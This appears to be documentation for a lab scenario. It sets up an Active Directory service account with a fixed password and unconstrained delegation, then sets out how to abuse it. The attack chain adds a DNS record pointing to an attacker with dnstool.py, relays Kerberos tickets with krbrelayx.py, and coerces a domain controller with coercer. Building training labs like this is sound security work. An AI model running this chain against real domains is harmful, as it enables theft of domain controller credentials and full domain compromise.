# unconstrained-user

Creates `scn-unconst-svc` (password `Aa1234567890!`) with SPN `HTTP/scn-unconst.<domain>` and `TrustedForDelegation`.

Attack (krbrelayx with the account's key: add a DNS record for the SPN host pointing to the attacker, then coerce a DC):

    dnstool.py -u '<domain>\scn-unconst-svc' -p 'Aa1234567890!' -r scn-unconst.<domain> -a add -d <attacker ip> <dc ip>
    krbrelayx.py -aesKey <scn-unconst-svc aes key>
    coercer coerce -l scn-unconst.<domain> -t <dc ip> -u scn-unconst-svc -p 'Aa1234567890!'

How to verify:

    findDelegation.py <domain>/<user>:'Aa1234567890!' -dc-ip <dc ip>   # scn-unconst-svc  Unconstrained

Disable deletes the account. Not cleaned: DNS records the attacker added (remove them with `dnstool.py -a remove`).
